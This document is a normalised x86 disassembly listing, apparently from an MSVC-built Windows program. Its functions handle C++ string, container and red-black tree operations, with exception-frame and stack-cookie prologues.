lea esi [ esp + 0x20 ]
call sub_40acb0
mov edi [ esp + 0x24 ]
mov esi [ esp + 0x20 ]
mov edx [ esp + 0x34 ]
push edx
push 0x1
lea eax [ esp + 0x28 ]
push eax
cmp ecx edi
jne r-xdata
cmp ebp edx
jae r-xdata
mov ebp eax
mov ebp [ esp + 0x1c ]
cmp eax ebp
jae r-xdata
cmp [ esp + 0x20 ] 0x10
jb r-xdata
mov edx ebp
add esi 0x4
lea eax [ esi + 0x4 ]
mov esi [ eax ]
jmp r-xdata
test edx edx
je r-xdata
mov eax [ esi ]
cmp eax [ ecx ]
jne r-xdata
cmp edx 0x4
jb r-xdata
xor eax eax
movzx eax [ esi ]
movzx ebx [ ecx ]
sub eax ebx
jne r-xdata
sub edx 0x4
add ecx 0x4
add esi 0x4
cmp edx 0x4
jae r-xdata
setl al
mov [ esp + 0x14 ] al
test al al
je r-xdata
mov eax [ edi + 0x20 ]
cmp ebp eax
jae r-xdata
mov ebx [ esp + 0x30 ]
sar eax 0x1f
or eax 0x1
jmp r-xdata
cmp edx 0x1
jbe r-xdata
mov edi [ edi + 0x8 ]
mov edi [ edi ]
jmp r-xdata
xor edx edx
cmp ebp eax
setne dl
mov eax edx
or eax 0xffffffff
jmp r-xdata
test eax eax
jne r-xdata
mov ebx [ esp + 0x30 ]
movzx eax [ esi + 0x1 ]
movzx ebx [ ecx + 0x1 ]
sub eax ebx
jne r-xdata
mov esi [ esp + 0x34 ]
mov eax [ esp + 0x18 ]
mov ebp [ esp + 0x2c ]
mov ecx [ esp + 0x10 ]
cmp [ edi + 0x45 ] 0x0
je r-xdata
test eax eax
cmp edx 0x2
jbe r-xdata
movzx eax [ esi + 0x2 ]
movzx ebx [ ecx + 0x2 ]
sub eax ebx
jne r-xdata
cmp edx 0x3
jbe r-xdata
movzx eax [ esi + 0x3 ]
movzx ecx [ ecx + 0x3 ]
sub eax ecx
sub_408930
sub esp 0x18
push ebx
push ebp
mov ebp [ esp + 0x28 ]
push edi
mov ecx ebp
mov eax esi
call sub_40a4b0
mov ebx eax
mov [ esp + 0x14 ] ebx
test esi esi
jne r-xdata
mov eax [ esi ]
mov edi [ esi + 0x18 ]
mov [ esp + 0x10 ] eax
test eax eax
je r-xdata
call sub_40ee1a
call sub_40ee1a
cmp eax eax
je r-xdata
mov eax [ esi + 0x18 ]
mov ecx [ esi ]
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] ecx
lea eax [ esp + 0x18 ]
lea eax [ ebx + 0xc ]
mov edx ebp
call sub_4095d0
test al al
jne r-xdata
cmp ebx edi
je r-xdata
lea eax [ esp + 0x10 ]
jmp r-xdata
mov edx [ eax ]
mov ecx [ esp + 0x28 ]
mov eax [ eax + 0x4 ]
pop edi
pop ebp
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop ebx
add esp 0x18
retn 0x8
sub_4089b0
mov eax [ esi ]
test eax eax
jne r-xdata
mov eax [ eax ]
jmp r-xdata
call sub_40ee1a
mov eax [ esi ]
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx [ eax + 0x18 ]
jne r-xdata
xor eax eax
mov eax [ esi + 0x4 ]
add eax 0xc
retn
call sub_40ee1a
sub_4089e0
push 0xffffffff
push sub_4208e8
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x1c ]
mov eax [ esp + 0x20 ]
xor ebx ebx
push 0xffffffff
push ebx
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
push eax
mov ecx esi
mov [ esi + 0x4 ] bl
call sub_408b10
mov edx [ esp + 0x24 ]
push 0xffffffff
lea ecx [ esi + 0x1c ]
mov [ esp + 0x18 ] ebx
push ebx
mov [ ecx + 0x18 ] 0xf
mov [ ecx + 0x14 ] ebx
push edx
mov [ ecx + 0x4 ] bl
call sub_408b10
mov eax esi
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
add esp 0xc
retn 0xc
sub_408a80
or eax 0xffffffff
sub eax [ esi + 0x14 ]
cmp eax 0x1
ja r-xdata
push edi
mov edi [ esi + 0x14 ]
inc edi
cmp edi 0xfffffffe
jbe r-xdata
call sub_40e13b
mov eax [ esi + 0x18 ]
cmp eax edi
jae r-xdata
call sub_40e13b
test edi edi
jne r-xdata
mov ecx [ esi + 0x14 ]
push ecx
push edi
mov ecx esi
call sub_40a700
test edi edi
jbe r-xdata
mov [ esi + 0x14 ] edi
cmp eax 0x10
jb r-xdata
mov eax esi
pop edi
retn
mov edx 0x10
push ebp
mov ebp [ esi + 0x14 ]
lea eax [ esi + 0x4 ]
cmp [ esi + 0x18 ] edx
jb r-xdata
lea eax [ esi + 0x4 ]
mov [ eax ] 0x0
mov eax esi
pop edi
retn
mov eax [ esi + 0x4 ]
mov [ eax ] 0x0
mov eax esi
pop edi
retn
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
mov [ eax + edi ] 0x0
mov eax [ eax ]
mov [ ecx + ebp ] bl
mov [ esi + 0x14 ] edi
pop ebp
cmp [ esi + 0x18 ] edx
jb r-xdata
sub_408b10
push ebx
mov ebx [ esp + 0x8 ]
push ebp
mov ebp [ esp + 0x10 ]
push esi
push edi
mov esi ecx
cmp [ ebx + 0x14 ] ebp
jae r-xdata
mov edi [ ebx + 0x14 ]
mov eax [ esp + 0x1c ]
sub edi ebp
cmp eax edi
jae r-xdata
call sub_40e173
cmp esi ebx
jne r-xdata
mov edi eax
cmp edi 0xfffffffe
jbe r-xdata
push 0xffffffff
add edi ebp
push edi
mov ecx esi
call sub_409930
push ebp
push 0x0
mov ecx esi
call sub_409930
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0xc
mov eax [ esi + 0x18 ]
cmp eax edi
jae r-xdata
call sub_40e13b
test edi edi
jne r-xdata
mov eax [ esi + 0x14 ]
push eax
push edi
mov ecx esi
call sub_40a700
test edi edi
jbe r-xdata
mov [ esi + 0x14 ] edi
cmp eax 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0xc
cmp [ ebx + 0x18 ] 0x10
jb r-xdata
lea eax [ esi + 0x4 ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebp
pop ebx
retn 0xc
mov eax [ esi + 0x4 ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebp
pop ebx
retn 0xc
lea edx [ ebx + 0x4 ]
mov edx [ ebx + 0x4 ]
jmp r-xdata
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
mov ecx [ esi + 0x18 ]
lea ebx [ esi + 0x4 ]
cmp ecx 0x10
jb r-xdata
mov [ ebx + edi ] 0x0
mov ebx [ ebx ]
push edi
add edx ebp
push edx
push ecx
push eax
call sub_40f306
add esp 0x10
cmp [ esi + 0x18 ] 0x10
mov [ esi + 0x14 ] edi
jb r-xdata
sub_408bf0
mov edx [ rw-data ]
mov eax [ rw-data ]
sub esp 0x8
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push esi
push edi
cmp edx 0x10
jb r-xdata
mov edi rw-data
jmp r-xdata
mov edi eax
test eax eax
je r-xdata
mov ecx eax
cmp edx 0x10
jae r-xdata
call sub_40ee1a
cmp ecx edi
ja r-xdata
mov ecx rw-data
cmp eax 0xfffffffc
je r-xdata
xor ebx ebx
jmp r-xdata
cmp edx 0x10
jae r-xdata
sub esi edi
mov ebx esi
test eax eax
je r-xdata
mov edx [ esp + 0x28 ]
mov edi ecx
mov ecx [ esp + 0x2c ]
mov [ esp + 0x10 ] eax
mov [ esp + 0x10 ] edx
mov esi ecx
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
add eax ecx
cmp edi eax
jbe r-xdata
mov eax rw-data
push esi
push ebx
mov ecx rw-data
call sub_409930
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov eax edx
cmp ecx 0x10
jae r-xdata
cmp edx 0xfffffffc
je r-xdata
call sub_40ee1a
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x20 ]
cmp eax rw-data
je r-xdata
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x20 ]
mov [ esp + 0x10 ] eax
mov esi ecx
test ecx ecx
jne r-xdata
lea esi [ eax + ebx ]
mov [ ebp ] 0x0
test esi esi
je r-xdata
mov eax rw-data
sub esi edi
test edx edx
je r-xdata
call sub_40ee1a
mov eax edx
cmp ecx 0x10
jae r-xdata
call sub_40ee1a
cmp edx eax
je r-xdata
cmp eax esi
ja r-xdata
mov eax rw-data
mov eax edx
cmp ecx 0x10
jae r-xdata
mov edx [ rw-data ]
add eax edx
cmp esi eax
jbe r-xdata
mov eax rw-data
pop edi
mov [ ebp + 0x4 ] esi
pop esi
mov [ ebp ] rw-data
mov eax ebp
pop ebp
pop ebx
add esp 0x8
retn 0x14
sub_408d20
mov ecx [ rw-data ]
push ebx
mov ebx [ rw-data ]
push esi
mov eax ebx
cmp ecx 0x10
jae r-xdata
mov edx [ rw-data ]
lea esi [ eax + edx ]
mov [ edi ] 0x0
test esi esi
je r-xdata
mov eax rw-data
call sub_40ee1a
mov eax ebx
cmp ecx 0x10
jae r-xdata
cmp eax esi
ja r-xdata
mov eax rw-data
mov eax ebx
cmp ecx 0x10
jae r-xdata
add eax edx
cmp esi eax
jbe r-xdata
mov eax rw-data
mov [ edi + 0x4 ] esi
pop esi
mov [ edi ] rw-data
mov eax edi
pop ebx
retn
sub_408d90
mov ecx [ esp + 0xc ]
push ebp
mov ebp [ esp + 0xc ]
test ecx ecx
jne r-xdata
mov eax [ esp + 0x8 ]
push ebx
push esi
push edi
mov edi [ eax + 0x14 ]
test edi edi
jbe r-xdata
xor eax eax
pop ebp
retn 0xc
pop edi
pop esi
pop ebx
or eax 0xffffffff
pop ebp
retn 0xc
cmp ecx edi
ja r-xdata
mov edx 0x1
sub edx ecx
add edi edx
cmp [ eax + 0x18 ] 0x10
jb r-xdata
lea ebx [ eax + 0x4 ]
mov [ esp + 0x18 ] ebx
mov ebx [ eax + 0x4 ]
add eax 0x4
mov [ esp + 0x18 ] eax
jmp r-xdata
lea esp [ esp ]
movsx eax [ ebp ]
push edi
push eax
push ebx
call sub_40e900
mov esi eax
add esp 0xc
test esi esi
je r-xdata
mov edx [ esp + 0x14 ]
cmp [ edx + 0x18 ] 0x10
jb r-xdata
movsx ecx [ ebp ]
sub ebx esi
lea edi [ edi + ebx - 0x1 ]
push edi
push ecx
lea ebx [ esi + 0x1 ]
push ebx
call sub_40e900
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov ecx [ esp + 0x18 ]
pop edi
mov eax esi
pop esi
pop ebx
sub eax ecx
pop ebp
retn 0xc
mov eax [ esp + 0x18 ]
mov ecx [ eax ]
pop edi
mov eax esi
pop esi
pop ebx
sub eax ecx
pop ebp
retn 0xc
mov eax [ esp + 0x1c ]
mov ecx ebp
mov edx esi
call sub_401050
test eax eax
je r-xdata
sub_408e60
sub esp 0xc
push ebx
push ebp
push esi
mov esi [ rw-data ]
push edi
mov edi [ rw-data ]
mov ecx edi
sub ecx esi
mov eax 0x2aaaaaab
imul ecx
sar edx 0x2
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
cmp esi edi
jbe r-xdata
xor esi esi
jmp r-xdata
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
call sub_40ee1a
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x28 ]
mov eax [ esp + 0x24 ]
push ecx
push edx
push eax
call sub_4099e0
mov edi [ rw-data ]
cmp edi [ rw-data ]
jbe r-xdata
call sub_40ee1a
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx eax
mov ebp ebx
mov [ esp + 0x18 ] edi
test eax eax
jne r-xdata
call sub_40ee1a
mov ecx [ esp + 0x2c ]
sub ecx esi
mov eax 0x2aaaaaab
imul ecx
sar edx 0x2
mov esi edx
shr esi 0x1f
add esi edx
mov eax [ eax ]
jmp r-xdata
call sub_40ee1a
xor eax eax
lea ecx [ esi + esi * 2 ]
lea esi [ edi + ecx * 8 ]
cmp esi [ eax + 0x10 ]
ja r-xdata
call sub_40ee1a
test ebx ebx
je r-xdata
xor ebx ebx
mov ebx [ ebx ]
jmp r-xdata
mov eax [ esp + 0x20 ]
pop edi
mov [ eax + 0x4 ] esi
pop esi
mov [ eax ] ebp
pop ebp
pop ebx
add esp 0xc
retn 0x10
cmp esi [ ebx + 0xc ]
jae r-xdata
sub_408f40
push 0xffffffff
push sub_420aa5
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ rw-data ]
lea ecx [ eax + 0x1 ]
mov eax [ rw-data ]
cmp eax ecx
ja r-xdata
mov edx [ rw-data ]
mov ecx [ rw-data ]
lea esi [ edx + ecx ]
cmp eax esi
ja r-xdata
call sub_409dd0
mov eax [ rw-data ]
mov edx [ rw-data ]
cmp [ edx + esi * 4 ] 0x0
jne r-xdata
sub esi eax
mov edx [ rw-data ]
mov ecx [ edx + esi * 4 ]
mov [ esp + 0x14 ] 0x0
test ecx ecx
je r-xdata
push 0x1c
call sub_40fd2d
mov ecx [ rw-data ]
add esp 0x4
mov [ ecx + esi * 4 ] eax
inc [ rw-data ]
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0x10
retn 0x4
mov eax [ esp + 0x1c ]
push 0xffffffff
push 0x0
mov [ ecx + 0x18 ] 0xf
mov [ ecx + 0x14 ] 0x0
push eax
mov [ ecx + 0x4 ] 0x0
call sub_408b10
sub_409000
mov eax [ rw-data ]
push ebx
xor ebx ebx
push esi
cmp eax ebx
je r-xdata
mov esi [ rw-data ]
mov eax [ rw-data ]
cmp esi ebx
jbe r-xdata
lea ecx [ ecx ]
cmp eax ebx
je r-xdata
dec esi
cmp [ eax + esi * 4 ] ebx
je r-xdata
mov ecx [ rw-data ]
lea eax [ ecx + eax - 0x1 ]
mov ecx [ rw-data ]
cmp ecx eax
ja r-xdata
pop esi
mov [ rw-data ] ebx
mov [ rw-data ] ebx
pop ebx
retn
push eax
call sub_40f2fb
add esp 0x4
cmp esi ebx
ja r-xdata
mov ecx [ eax + esi * 4 ]
push ecx
call sub_40f2fb
mov eax [ rw-data ]
add esp 0x4
mov edx [ rw-data ]
mov esi [ edx + eax * 4 ]
cmp [ esi + 0x18 ] 0x10
jb r-xdata
sub eax ecx
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
mov [ esi + 0x4 ] bl
mov eax [ rw-data ]
sub eax 0x1
mov [ rw-data ] eax
jne r-xdata
mov eax [ esi + 0x4 ]
push eax
call sub_40f2fb
add esp 0x4
cmp eax ebx
je r-xdata
mov [ rw-data ] ebx
sub_4090b0
sub esp 0xc
push ebx
push ebp
push esi
mov esi eax
mov ebx [ esi + 0x10 ]
push edi
mov edi [ esi + 0xc ]
mov ecx ebx
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
cmp edi ebx
jbe r-xdata
xor edi edi
jmp r-xdata
mov ecx [ esp + 0x28 ]
mov eax [ esi ]
test ecx ecx
je r-xdata
call sub_40ee1a
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x28 ]
mov eax [ esp + 0x24 ]
push ecx
push edx
push eax
mov ecx esi
call sub_409fe0
mov ebx [ esi + 0xc ]
cmp ebx [ esi + 0x10 ]
jbe r-xdata
call sub_40ee1a
cmp ecx eax
je r-xdata
mov esi [ esi ]
mov ebp esi
mov [ esp + 0x18 ] ebx
test esi esi
jne r-xdata
call sub_40ee1a
mov ecx [ esp + 0x2c ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov edi edx
shr edi 0x1f
add edi edx
mov eax [ esi ]
jmp r-xdata
call sub_40ee1a
xor eax eax
lea ecx [ edi * 8 ]
sub ecx edi
lea edi [ ebx + ecx * 4 ]
cmp edi [ eax + 0x10 ]
ja r-xdata
call sub_40ee1a
test esi esi
je r-xdata
xor esi esi
mov esi [ esi ]
jmp r-xdata
mov eax [ esp + 0x20 ]
mov [ eax + 0x4 ] edi
pop edi
pop esi
mov [ eax ] ebp
pop ebp
pop ebx
add esp 0xc
retn 0x10
cmp edi [ esi + 0xc ]
jae r-xdata
sub_409190
push ecx
cmp esi 0x9249249
jbe r-xdata
mov ecx esi
call sub_409f50
lea ecx [ esi * 8 ]
sub ecx esi
lea edx [ eax + ecx * 4 ]
mov [ edi + 0xc ] eax
mov [ edi + 0x10 ] eax
mov [ edi + 0x14 ] edx
mov al 0x1
pop ecx
retn
call sub_40a2e0
sub_4091c0
push ecx
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov [ esi + 0xc ] 0x0
mov [ esi + 0x10 ] 0x0
mov [ esi + 0x14 ] 0x0
pop ecx
retn
mov ecx [ esp ]
push edi
mov edi [ esi + 0x10 ]
push ecx
call sub_40b130
mov edx [ esi + 0xc ]
push edx
call sub_40f2fb
add esp 0x8
pop edi
sub_409200
push 0xffffffff
push sub_420838
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x8 ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x18 ]
push 0x4
call sub_40fd2d
add esp 0x4
test eax eax
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ esi ] eax
mov [ esp + 0x10 ] 0x0
call sub_40ac70
mov [ esi + 0x18 ] eax
mov [ eax + 0x45 ] 0x1
mov eax [ esi + 0x18 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x18 ]
mov [ eax ] eax
mov eax [ esi + 0x18 ]
mov [ eax + 0x8 ] eax
mov [ esi + 0x1c ] 0x0
mov eax esi
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0xc
retn 0x4
sub_409280
push ecx
push ebx
push esi
mov esi [ esp + 0x10 ]
xor ebx ebx
push edi
mov [ esp + 0xc ] ecx
mov edi esi
cmp [ esi + 0x45 ] bl
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
retn 0x4
push ebp
lea ebp [ ebx + 0xf ]
lea esp [ esp ]
mov [ esi + 0x40 ] ebp
mov [ esi + 0x3c ] ebx
mov [ esi + 0x2c ] bl
cmp [ esi + 0x24 ] 0x10
jb r-xdata
mov ecx [ esi + 0x2c ]
push ecx
call sub_40f2fb
add esp 0x4
mov [ esi + 0x24 ] ebp
mov [ esi + 0x20 ] ebx
push esi
mov [ esi + 0x10 ] bl
call sub_40f2fb
add esp 0x4
mov esi edi
cmp [ edi + 0x45 ] bl
je r-xdata
mov edx [ esi + 0x10 ]
push edx
call sub_40f2fb
add esp 0x4
mov eax [ edi + 0x8 ]
mov ecx [ esp + 0x10 ]
push eax
call sub_409280
cmp [ esi + 0x40 ] 0x10
mov edi [ edi ]
jb r-xdata
pop ebp
sub_409300
push 0xffffffff
push sub_420a18
mov eax [ fs : 0x0 ]
push eax
sub esp 0x44
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x58 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ebp [ esp + 0x68 ]
cmp [ ebp + 0x1c ] 0x4924923
jb r-xdata
mov edx [ esp + 0x74 ]
mov eax [ ebp + 0x18 ]
push edx
push eax
push esi
push eax
call sub_40a660
mov ecx [ ebp + 0x18 ]
mov edx eax
mov eax 0x1
add [ ebp + 0x1c ] eax
xor ebx ebx
mov [ esp + 0x68 ] edx
cmp esi ecx
jne r-xdata
push 0x13
xor ebx ebx
push r--data
lea ecx [ esp + 0x1c ]
mov [ esp + 0x34 ] 0xf
mov [ esp + 0x30 ] ebx
mov [ esp + 0x20 ] bl
call sub_409850
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x34 ]
mov [ esp + 0x64 ] ebx
call sub_4010d0
push r--data
lea ecx [ esp + 0x34 ]
push ecx
mov [ esp + 0x38 ] r--data
call sub_41070b
cmp [ esp + 0x70 ] bl
je r-xdata
mov [ ecx + 0x4 ] edx
mov ecx [ ebp + 0x18 ]
mov [ ecx ] edx
mov ecx [ ebp + 0x18 ]
jmp r-xdata
mov [ esi + 0x8 ] edx
mov ecx [ ebp + 0x18 ]
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov [ esi ] edx
mov ecx [ ebp + 0x18 ]
cmp esi [ ecx ]
jne r-xdata
mov [ ecx + 0x8 ] edx
mov esi [ edx + 0x4 ]
lea ecx [ edx + 0x4 ]
cmp [ esi + 0x44 ] bl
jne r-xdata
mov [ ecx ] edx
jmp r-xdata
mov ecx [ ebp + 0x18 ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + 0x44 ] al
mov ecx [ esp + 0x6c ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp ]
mov [ ecx ] edx
mov eax ecx
mov ecx [ esp + 0x58 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x50
retn 0x10
mov esi [ ecx ]
mov edi [ esi + 0x4 ]
cmp esi [ edi ]
jne r-xdata
mov edi [ edi ]
cmp [ edi + 0x44 ] bl
jne r-xdata
mov edi [ edi + 0x8 ]
cmp [ edi + 0x44 ] bl
je r-xdata
cmp edx [ esi ]
jne r-xdata
mov edx esi
mov [ edx + 0x44 ] al
mov [ edi + 0x44 ] al
mov edx [ ecx ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x44 ] bl
mov ecx [ ecx ]
mov edx [ ecx + 0x4 ]
jmp r-xdata
cmp edx [ esi + 0x8 ]
jne r-xdata
mov esi [ ecx ]
mov [ esi + 0x44 ] al
mov esi [ ecx ]
mov esi [ esi + 0x4 ]
mov [ esi + 0x44 ] bl
mov ecx [ ecx ]
mov ecx [ ecx + 0x4 ]
mov esi [ ecx + 0x8 ]
mov edi [ esi ]
mov [ ecx + 0x8 ] edi
mov edi [ esi ]
cmp [ edi + 0x45 ] bl
jne r-xdata
mov edx esi
mov esi [ edx ]
mov ecx [ esi + 0x8 ]
mov [ edx ] ecx
mov ecx [ esi + 0x8 ]
cmp [ ecx + 0x45 ] bl
jne r-xdata
mov esi [ edx + 0x4 ]
lea ecx [ edx + 0x4 ]
cmp [ esi + 0x44 ] bl
je r-xdata
mov esi [ ecx ]
mov [ esi + 0x44 ] al
mov esi [ ecx ]
mov esi [ esi + 0x4 ]
mov [ esi + 0x44 ] bl
mov ecx [ ecx ]
mov ecx [ ecx + 0x4 ]
mov esi [ ecx ]
mov edi [ esi + 0x8 ]
mov [ ecx ] edi
mov edi [ esi + 0x8 ]
cmp [ edi + 0x45 ] bl
jne r-xdata
mov edx esi
mov esi [ edx + 0x8 ]
mov ecx [ esi ]
mov [ edx + 0x8 ] ecx
mov ecx [ esi ]
cmp [ ecx + 0x45 ] bl
jne r-xdata
mov edi [ ecx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ ebp + 0x18 ]
cmp ecx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] ecx
mov edi [ edx + 0x4 ]
lea ecx [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ ebp + 0x18 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ ecx + 0x4 ] edx
mov edx [ esp + 0x68 ]
mov edi [ ecx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ ebp + 0x18 ]
cmp ecx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] ecx
mov edi [ edx + 0x4 ]
lea ecx [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ ebp + 0x18 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ ecx + 0x4 ] edx
mov edi [ ecx + 0x4 ]
cmp ecx [ edi ]
jne r-xdata
mov [ edi + 0x4 ] esi
jmp r-xdata
mov edi [ ecx ]
cmp edx [ edi + 0x8 ]
jne r-xdata
mov [ edi + 0x4 ] esi
jmp r-xdata
mov edi [ ecx + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov [ edi + 0x4 ] esi
mov [ esi + 0x8 ] ecx
jmp r-xdata
mov edi [ ecx ]
cmp edx [ edi ]
jne r-xdata
mov [ edi + 0x4 ] esi
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ edi ] esi
jmp r-xdata
mov [ esi ] ecx
mov [ edi ] esi
mov [ edi + 0x8 ] esi
jmp r-xdata
mov [ esi + 0x8 ] edx
mov [ ecx ] esi
mov [ edi ] esi
mov [ esi + 0x8 ] ecx
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ esi + 0x8 ] ecx
jmp r-xdata
mov [ ecx + 0x4 ] esi
mov [ edi + 0x8 ] esi
mov [ edi ] esi
jmp r-xdata
mov [ esi ] edx
mov [ ecx ] esi
sub_409590
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax [ esi + 0x18 ]
mov ecx [ esi ]
mov edx [ eax ]
sub esp 0x8
push eax
push ecx
push edx
push ecx
lea eax [ esp + 0x10 ]
push eax
mov eax esi
call sub_40a360
mov ecx [ esi + 0x18 ]
push ecx
call sub_40f2fb
add esp 0x4
xor eax eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] eax
mov esp ebp
pop ebp
retn
sub_4095d0
cmp [ eax + 0x18 ] 0x10
push esi
push edi
mov edi [ eax + 0x14 ]
jb r-xdata
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
cmp [ edx + 0x18 ] 0x10
jb r-xdata
mov eax edi
mov esi [ edx + 0x14 ]
mov eax esi
cmp esi edi
jb r-xdata
add edx 0x4
mov edx [ edx + 0x4 ]
jmp r-xdata
xor ecx ecx
test eax eax
setl cl
pop edi
mov al cl
pop esi
retn
cmp esi edi
jae r-xdata
call sub_401050
test eax eax
jne r-xdata
xor eax eax
cmp esi edi
setne al
or eax 0xffffffff
xor ecx ecx
test eax eax
setl cl
pop edi
mov al cl
pop esi
retn
sub_409650
push ebx
push ebp
mov ebp [ esp + 0xc ]
push edi
mov edi [ esp + 0x14 ]
mov ebx eax
cmp [ ebp + 0x14 ] edi
jae r-xdata
mov eax [ ebp + 0x14 ]
sub eax edi
cmp eax ebx
jae r-xdata
call sub_40e173
mov eax [ esi + 0x14 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
jbe r-xdata
mov ebx eax
call sub_40e13b
lea edx [ eax + ebx ]
cmp edx eax
jae r-xdata
test ebx ebx
jbe r-xdata
pop edi
pop ebp
mov eax esi
pop ebx
retn 0x8
mov edi [ esi + 0x14 ]
add edi ebx
cmp edi 0xfffffffe
jbe r-xdata
mov eax [ esi + 0x18 ]
cmp eax edi
jae r-xdata
call sub_40e13b
test edi edi
jne r-xdata
mov eax [ esi + 0x14 ]
push eax
push edi
mov ecx esi
call sub_40a700
test edi edi
jbe r-xdata
mov [ esi + 0x14 ] edi
cmp eax 0x10
jb r-xdata
cmp [ ebp + 0x18 ] 0x10
jb r-xdata
pop edi
lea eax [ esi + 0x4 ]
pop ebp
mov [ eax ] 0x0
mov eax esi
pop ebx
retn 0x8
mov eax [ esi + 0x4 ]
pop edi
pop ebp
mov [ eax ] 0x0
mov eax esi
pop ebx
retn 0x8
add ebp 0x4
mov ebp [ ebp + 0x4 ]
jmp r-xdata
lea edx [ esi + 0x4 ]
mov edx [ esi + 0x4 ]
jmp r-xdata
mov eax [ esi + 0x18 ]
cmp eax 0x10
jb r-xdata
lea eax [ esi + 0x4 ]
mov [ eax + edi ] 0x0
mov eax [ esi + 0x4 ]
mov [ eax + edi ] 0x0
pop edi
pop ebp
mov eax esi
pop ebx
retn 0x8
mov ecx [ esi + 0x14 ]
push ebx
mov ebx [ esp + 0x18 ]
add ebp ebx
sub eax ecx
push ebp
push eax
add ecx edx
push ecx
call sub_40f306
add esp 0x10
cmp [ esi + 0x18 ] 0x10
mov [ esi + 0x14 ] edi
jb r-xdata
sub_409740
mov ecx [ esp + 0x4 ]
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
push edi
mov esi eax
test ecx ecx
je r-xdata
mov eax [ esi + 0x14 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebp
jbe r-xdata
mov edi [ esi + 0x18 ]
lea eax [ esi + 0x4 ]
cmp edi 0x10
jb r-xdata
call sub_40e13b
lea edx [ eax + ebp ]
cmp edx eax
jae r-xdata
mov edx eax
mov edx [ eax ]
jmp r-xdata
test ebp ebp
jbe r-xdata
cmp edi 0x10
jb r-xdata
cmp ecx edx
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x8
mov edi [ esi + 0x14 ]
add edi ebp
cmp edi 0xfffffffe
jbe r-xdata
mov edx eax
mov edx [ eax ]
jmp r-xdata
mov eax [ esi + 0x18 ]
cmp eax edi
jae r-xdata
call sub_40e13b
cmp edi 0x10
jb r-xdata
mov ebx [ esi + 0x14 ]
add ebx edx
cmp ebx ecx
jbe r-xdata
test edi edi
jne r-xdata
mov eax [ esi + 0x14 ]
push eax
push edi
mov ecx esi
call sub_40a700
test edi edi
sub ecx eax
push ecx
push esi
mov eax ebp
call sub_409650
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
mov eax [ eax ]
jbe r-xdata
mov [ esi + 0x14 ] edi
cmp eax 0x10
jb r-xdata
mov eax [ esi + 0x18 ]
lea ebx [ esi + 0x4 ]
cmp eax 0x10
